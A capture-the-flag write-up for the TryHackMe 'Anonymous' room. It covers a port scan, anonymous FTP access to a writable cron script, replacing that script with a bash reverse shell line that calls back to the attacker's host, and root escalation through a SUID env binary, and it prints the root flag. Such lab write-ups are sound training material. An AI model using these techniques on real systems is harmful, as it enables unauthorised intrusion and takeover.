# Anonymous

Link to the room: https://tryhackme.com/room/anonymous

## Let's start !!

First, we set an IP variable

````````
export IP=10.10.27.113
````````

### Rustscan 

As always we start with rustscan I like its style and it instantly gives a response after discovering an open port. The drawback is that we cannot scan it for UDP.

````````
rustscan -a $IP -- -A -sC -oN nmap.txt
````````

````````
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.27.113:21
Open 10.10.27.113:22
Open 10.10.27.113:139
Open 10.10.27.113:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 02:14 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:14
Completed NSE at 02:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:14
Completed NSE at 02:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:14
Completed NSE at 02:14, 0.00s elapsed
Initiating Ping Scan at 02:14
Scanning 10.10.27.113 [4 ports]
Completed Ping Scan at 02:14, 0.28s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:14
Completed Parallel DNS resolution of 1 host. at 02:14, 0.06s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 02:14
Scanning 10.10.27.113 [4 ports]
Discovered open port 21/tcp on 10.10.27.113
Discovered open port 22/tcp on 10.10.27.113
Discovered open port 445/tcp on 10.10.27.113
Discovered open port 139/tcp on 10.10.27.113
Completed SYN Stealth Scan at 02:14, 0.29s elapsed (4 total ports)
Initiating Service scan at 02:14
Scanning 4 services on 10.10.27.113
Completed Service scan at 02:14, 11.84s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.10.27.113
Retrying OS detection (try #2) against 10.10.27.113
Initiating Traceroute at 02:14
Completed Traceroute at 02:14, 0.19s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 02:14
Completed Parallel DNS resolution of 2 hosts. at 02:14, 0.06s elapsed
DNS resolution of 2 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.27.113.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:14
NSE: [ftp-bounce 10.10.27.113:21] PORT response: 500 Illegal PORT command.
Completed NSE at 02:14, 6.09s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:14
Completed NSE at 02:14, 1.38s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:14
Completed NSE at 02:14, 0.00s elapsed
Nmap scan report for 10.10.27.113
Host is up, received reset ttl 63 (0.19s latency).
Scanned at 2022-05-31 02:14:15 IST for 26s

PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.126.243
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCi47ePYjDctfwgAphABwT1jpPkKajXoLvf3bb/zvpvDvXwWKnm6nZuzL2HA1veSQa90ydSSpg8S+B8SLpkFycv7iSy2/Jmf7qY+8oQxWThH1fwBMIO5g/TTtRRta6IPoKaMCle8hnp5pSP5D4saCpSW3E5rKd8qj3oAj6S8TWgE9cBNJbMRtVu1+sKjUy/7ymikcPGAjRSSaFDroF9fmGDQtd61oU5waKqurhZpre70UfOkZGWt6954rwbXthTeEjf+4J5+gIPDLcKzVO7BxkuJgTqk4lE9ZU/5INBXGpgI5r4mZknbEPJKS47XaOvkqm9QWveoOSQgkqdhIPjnhD
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPjHnAlR7sBuoSM2X5sATLllsFrcUNpTS87qXzhMD99aGGzyOlnWmjHGNmm34cWSzOohxhoK2fv9NWwcIQ5A/ng=
|   256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDHIuFL9AdcmaAIY7u+aJil1covB44FA632BSQ7sUqap
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=5/31%OT=21%CT=%CU=40074%PV=Y%DS=2%DC=T%G=N%TM=62952CB9%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=2%ISR=10C%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)
WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 5.014 days (since Thu May 26 01:54:31 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 1s, median: -1s
| smb2-time: 
|   date: 2022-05-30T20:44:33
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 60713/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 53419/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 39866/udp): CLEAN (Failed to receive data)
|   Check 4 (port 41241/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ANONYMOUS<00>        Flags: <unique><active>
|   ANONYMOUS<03>        Flags: <unique><active>
|   ANONYMOUS<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2022-05-30T20:44:34+00:00

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   188.73 ms 10.8.0.1
2   188.80 ms 10.10.27.113

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:14
Completed NSE at 02:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:14
Completed NSE at 02:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:14
Completed NSE at 02:14, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.09 seconds
           Raw packets sent: 62 (4.284KB) | Rcvd: 45 (3.248KB)

````````
So we have 4 ports open 21(FTP) ,22(ssh) ,139 and 445(smb). First lets check what in ftp... 

### FTP 

````````
ftp $IP
````````

````````
Connected to 10.10.27.113.
220 NamelessOne's FTP Server!
Name (10.10.27.113:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||17510|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||46482|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000          989 May 30 20:45 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> mget *
mget clean.sh [anpqy?]? 
229 Entering Extended Passive Mode (|||14421|)
150 Opening BINARY mode data connection for clean.sh (314 bytes).
100% |********************************************************************************************************************************|   314      463.20 KiB/s    00:00 ETA
226 Transfer complete.
314 bytes received in 00:00 (1.61 KiB/s)
mget removed_files.log [anpqy?]? 
229 Entering Extended Passive Mode (|||33660|)
150 Opening BINARY mode data connection for removed_files.log (989 bytes).
100% |********************************************************************************************************************************|   989        1.41 MiB/s    00:00 ETA
226 Transfer complete.
989 bytes received in 00:00 (3.98 KiB/s)
mget to_do.txt [anpqy?]? 
229 Entering Extended Passive Mode (|||36314|)
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
100% |********************************************************************************************************************************|    68        0.79 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.20 KiB/s)
ftp> 


````````
okey, here we have 3 files lets download all of them and see what are they... the clean.sh is bash script which is running in background on our targeted machin. lets add our one liner bash reverse shell and upload it and hope to get an reverse shell back. 

````````c
bash -i >& /dev/tcp/YOUR_IP/8080 0>&1
````````

````````
ftp> put clean.sh 
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||21354|)
150 Ok to send data.
100% |*************************************************|    56        1.02 MiB/s    00:00 ETA
226 Transfer complete.
56 bytes sent in 00:00 (0.14 KiB/s)

````````
So, we have an shell. lets get our first flag. 

## Getting our first flag

````````
pwncat-cs -lp 8080
````````

````````
[02:35:10] Welcome to pwncat 🐈!                                                                                                                              __main__.py:164
[02:35:23] received connection from 10.10.27.113:57190                                                                                                             bind.py:84
[02:35:25] 0.0.0.0:8080: normalizing shell path                                                                                                                manager.py:957
[02:35:28] 10.10.27.113:57190: registered new host w/ db                                                                                                       manager.py:957
(local) pwncat$ 
(remote) namelessone@anonymous:/home/namelessone$ ls
pics  user.txt
remote) namelessone@anonymous:/home/namelessone$ cat user.txt
{REDACTED}

````````
YESS!!! we got user.txt. now lets esculate our privilaga and get root.txt.... 

## Privilage Esculation

````````
/usr/bin/env /bin/sh -p
````````

````````
\[\](remote)\[\] \[\]root@anonymous\[\]:\[\]/tmp\[\]$ whoami
root
\[\](remote)\[\] \[\]root@anonymous\[\]:\[\]/tmp\[\]$ cd /root
\[\](remote)\[\] \[\]root@anonymous\[\]:\[\]/root\[\]$ ls
root.txt
\[\](remote)\[\] \[\]root@anonymous\[\]:\[\]/root\[\]$ cat root.txt
4d930091c31a622a7ed10f27999af363
\[\](remote)\[\] \[\]root@anonymous\[\]:\[\]/root\[\]$ 

````````
- DONE




